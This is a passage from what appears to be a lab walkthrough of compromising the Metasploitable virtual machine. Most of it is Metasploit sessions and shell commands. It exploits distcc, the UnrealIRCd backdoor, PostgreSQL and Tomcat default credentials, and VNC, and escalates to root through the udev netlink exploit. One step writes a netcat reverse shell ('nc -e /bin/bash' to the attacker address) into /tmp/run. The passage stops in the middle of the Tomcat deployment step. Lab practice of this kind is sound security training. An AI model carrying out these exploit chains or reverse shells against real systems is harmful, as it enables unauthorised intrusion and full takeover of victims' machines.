<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/misc/distcc_exec
</span><span class='line'>msf exploit(distcc_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/misc/distcc_exec):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  3632             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(distcc_exec) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(distcc_exec) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(distcc_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/misc/distcc_exec):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  3632             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/reverse):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(distcc_exec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(distcc_exec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo VhuwDGXAoBmUMNcg;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "VhuwDGXAoBmUMNcg\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:52283) at 2014-06-05 21:34:46 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>daemon</span></code></pre></td></tr></table></div></figure>


<p>So we have a low privilege account. Time for some local privilege escalation. I will use this exploit: <a href="http://www.exploit-db.com/exploits/8572/">http://www.exploit-db.com/exploits/8572/</a></p>

<p><strong>Description</strong></p>

<p>udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space.</p>

<p><strong>Usage</strong></p>

<p>Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, usually is the udevd PID minus 1) as argv[1].</p>

<p>The exploit will execute /tmp/run as root so throw whatever payload you want in there.</p>

<p>Ok, on the command line on the victim, I looked for netcat and fortunately, it&rsquo;s installed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>whereis nc
</span><span class='line'>nc: /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz</span></code></pre></td></tr></table></div></figure>


<p>So I will compile the exploit and send it over netcat. I am on a 64 bit Kali and the target is 32 bit, so I compile it explicitly for 32 bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -m32 8572.c -o 8572
</span><span class='line'>nc -vv -l -p 5555 &lt; 8572</span></code></pre></td></tr></table></div></figure>


<p>From the victim, I go to the /tmp/ directory and grab the exploit from the attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n 192.168.127.159 5555 &gt; 8572</span></code></pre></td></tr></table></div></figure>


<p>Next, let&rsquo;s look for the PID:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/net/netlink</span></code></pre></td></tr></table></div></figure>


<p>And the relevant line is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
</span><span class='line'>df8cc200 15  2767   00000001 0        0        00000000 2</span></code></pre></td></tr></table></div></figure>


<p>Check that this is the correct PID by looking at the udev service:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps aux | grep udev
</span><span class='line'>root      2768  0.0  0.1   2092   620 ?        S&lt;s  14:11   0:00 /sbin/udevd --daemon</span></code></pre></td></tr></table></div></figure>


<p>It appears to be the right one (2768 &ndash; 1 = 2767)</p>

<p>Next, put some payload in /tmp/run, since that will be executed by the exploit. I will use netcat to connect to the atacker machine and give it a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo '#!/bin/bash' &gt; /tmp/run
</span><span class='line'>echo 'nc -e /bin/bash 192.168.127.159 5555' &gt;&gt; /tmp/run</span></code></pre></td></tr></table></div></figure>


<p>On the attacker machine, listen on port 5555:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 5555</span></code></pre></td></tr></table></div></figure>


<p>And on the victim machine, now that all is set up, I just make the exploit executable and run it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod +x 8572
</span><span class='line'>./8572 2767</span></code></pre></td></tr></table></div></figure>


<p>Now check our local netcat listener for the root shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.127.159 5555 from 192.168.127.154 (192.168.127.154) 35539 [35539]
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>A bit on effort on that one, but all the more rewarding! Let&rsquo;s move on.</p>

<h3>Port 5432 postgresql</h3>

<p>Since I already saw earlier that the mysql database wasn&rsquo;t password protected, I will try a bruteforce auxiliary module to see if I can get in this one.</p>

<p><strong>PostgreSQL Login Utility</strong></p>

<blockquote><p>This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and
USERPASS_FILE options.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/postgres/postgres_login
</span><span class='line'>msf auxiliary(postgres_login) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/postgres/postgres_login):
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                                             Required  Description
</span><span class='line'>   ----              ---------------                                                             --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   false                                                                       no        Try blank passwords for all users
</span><span class='line'>   BRUTEFORCE_SPEED  5                                                                           yes       How fast to bruteforce, from 0 to 5
</span><span class='line'>   DATABASE          template1                                                                   yes       The database to authenticate against
</span><span class='line'>   DB_ALL_CREDS      false                                                                       no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       false                                                                       no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      false                                                                       no        Add all users in the current database to the list
</span><span class='line'>   PASSWORD                                                                                      no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
</span><span class='line'>   RETURN_ROWSET     true                                                                        no        Set to true to see query result sets
</span><span class='line'>   RHOSTS                                                                                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             5432                                                                        yes       The target port
</span><span class='line'>   STOP_ON_SUCCESS   false                                                                       yes       Stop guessing when a credential works for a host
</span><span class='line'>   THREADS           1                                                                           yes       The number of concurrent threads
</span><span class='line'>   USERNAME          postgres                                                                    no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE     /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
</span><span class='line'>   USER_AS_PASS      false                                                                       no        Try the username as the password for all users
</span><span class='line'>   USER_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
</span><span class='line'>   VERBOSE           true                                                                        yes       Whether to print output for all attempts
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf auxiliary(postgres_login) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(postgres_login) &gt; set STOP_ON_SUCCESS true
</span><span class='line'>STOP_ON_SUCCESS =&gt; true
</span><span class='line'>msf auxiliary(postgres_login) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:5432 Postgres - [01/20] - Trying username:'postgres' with password:'postgres' on database 'template1'
</span><span class='line'>[+] 192.168.127.154:5432 Postgres - Logged in to 'template1' with 'postgres':'postgres'
</span><span class='line'>[+] 192.168.127.154:5432 Postgres - Success: postgres:postgres (Database 'template1' succeeded.)
</span><span class='line'>[*] 192.168.127.154:5432 Postgres - Disconnected
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s possible to log in to this database like earlier with mysql, but I searched through Metasploit&rsquo;s available exploits, and I stumbled upon one that can further the exploitation:</p>

<p><strong>PostgreSQL for Linux Payload Execution</strong></p>

<blockquote><p>On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries&rsquo;s
om there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE
pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared
object&rsquo;s constructor, it does not need to conform to specific Postgres API versions.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/postgres/postgres_payload
</span><span class='line'>msf exploit(postgres_payload) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/postgres/postgres_payload):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   DATABASE  template1        yes       The database to authenticate against
</span><span class='line'>   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPORT     5432             yes       The target port
</span><span class='line'>   USERNAME  postgres         yes       The username to authenticate as
</span><span class='line'>   VERBOSE   false            no        Enable verbose output
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Linux x86
</span><span class='line'>
</span><span class='line'>msf exploit(postgres_payload) &gt; set payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(postgres_payload) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>set PASSWORD postgres
</span><span class='line'>PASSWORD =&gt; postgres
</span><span class='line'>msf exploit(postgres_payload) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] 192.168.127.154:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
</span><span class='line'>[*] Uploaded as /tmp/uVhDfWDg.so, should be cleaned up automatically
</span><span class='line'>[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
</span><span class='line'>[*] Sending stage (1228800 bytes) to 192.168.127.154
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:37141) at 2014-06-06 22:49:17 +0300</span></code></pre></td></tr></table></div></figure>


<p>From here we again have to elevate our privileges. I will exploit the same vulnerability with the udev exploit, but this time from inside Metasploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 1...
</span><span class='line'>msf exploit(postgres_payload) &gt; use exploit/linux/local/udev_netlink
</span><span class='line'>msf exploit(udev_netlink) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/local/udev_netlink):
</span><span class='line'>
</span><span class='line'>   Name         Current Setting  Required  Description
</span><span class='line'>   ----         ---------------  --------  -----------
</span><span class='line'>   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
</span><span class='line'>   SESSION                       yes       The session to run this module on.
</span><span class='line'>   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Linux x86
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(udev_netlink) &gt; set SESSION 1
</span><span class='line'>SESSION =&gt; 1
</span><span class='line'>msf exploit(udev_netlink) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Attempting to autodetect netlink pid...
</span><span class='line'>[*] Meterpreter session, using get_processes to find netlink pid
</span><span class='line'>[*] udev pid: 2770
</span><span class='line'>[+] Found netlink pid: 2769
</span><span class='line'>[*] Writing payload executable (274 bytes) to /tmp/rzIcSWveTb
</span><span class='line'>[*] Writing exploit executable (1879 bytes) to /tmp/DQDnKUFLzR
</span><span class='line'>[*] chmod'ing and running it...
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:33383) at 2014-06-06 23:03:13 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>So, the same exploit that I manually used earlier was very easy and quick in Metasploit. Onwards!</p>

<h3>Port 5900 vnc</h3>

<p>The Nessus scan reported that the server is using the password &lsquo;password&rsquo;. So I will use vncviewer to connect to it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vncviewer 192.168.127.154
</span><span class='line'>Connected to RFB server, using protocol version 3.3
</span><span class='line'>Performing standard VNC authentication
</span><span class='line'>Password: 
</span><span class='line'>Authentication successful
</span><span class='line'>Desktop name "root's X desktop (metasploitable:0)"
</span><span class='line'>VNC server default format:
</span><span class='line'>  32 bits per pixel.
</span><span class='line'>  Least significant byte first in each pixel.
</span><span class='line'>  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
</span><span class='line'>Using default colormap which is TrueColor.  Pixel format:
</span><span class='line'>  32 bits per pixel.
</span><span class='line'>  Least significant byte first in each pixel.
</span><span class='line'>  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/vnc.png" title="vnc shell" alt="vnc"></p>

<p>And we have another root shell.</p>

<h3>Port 6667 irc</h3>

<p>An exploit is available for this:</p>

<p><strong>UnrealIRCD 3.2.8.1 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz
archive between November 2009 and June 12th 2010.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  6667             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse 
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Connected to 192.168.127.154:6667...
</span><span class='line'>    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
</span><span class='line'>    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
</span><span class='line'>[*] Sending backdoor command...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo qcHh6jsH8rZghWdi;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "qcHh6jsH8rZghWdi\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 3 opened (192.168.127.159:4444 -&gt; 192.168.127.154:41975) at 2014-06-06 23:31:44 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h3>Port 8180 tomcat</h3>

<p>First, let&rsquo;s see what information we can get using the <strong>Tomcat Administration Tool Default Access</strong> module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/admin/http/tomcat_administration
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/admin/http/tomcat_administration):
</span><span class='line'>
</span><span class='line'>   Name         Current Setting  Required  Description
</span><span class='line'>   ----         ---------------  --------  -----------
</span><span class='line'>   Proxies                       no        Use a proxy chain
</span><span class='line'>   RHOSTS                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT        8180             yes       The target port
</span><span class='line'>   THREADS      1                yes       The number of concurrent threads
</span><span class='line'>   TOMCAT_PASS                   no        The password for the specified username
</span><span class='line'>   TOMCAT_USER                   no        The username to authenticate as
</span><span class='line'>   VHOST                         no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; run
</span><span class='line'>
</span><span class='line'>[*] http://192.168.127.154:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>With credentials in hand, now we can use the <strong>Apache Tomcat Manager Application Deployer Authenticated Code Execution</strong> exploit:</p>

<blockquote><p>This module can be used to execute a payload on Apache Tomcat servers that have an exposed &ldquo;manager&rdquo; application. The payload is uploaded as a WAR archive
containing a jsp application using a PUT request. The manager application can also be abused using /manager/html/upload, but that method is not implemented in > this module. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows
payloads.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/tomcat_mgr_deploy
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/tomcat_mgr_deploy):
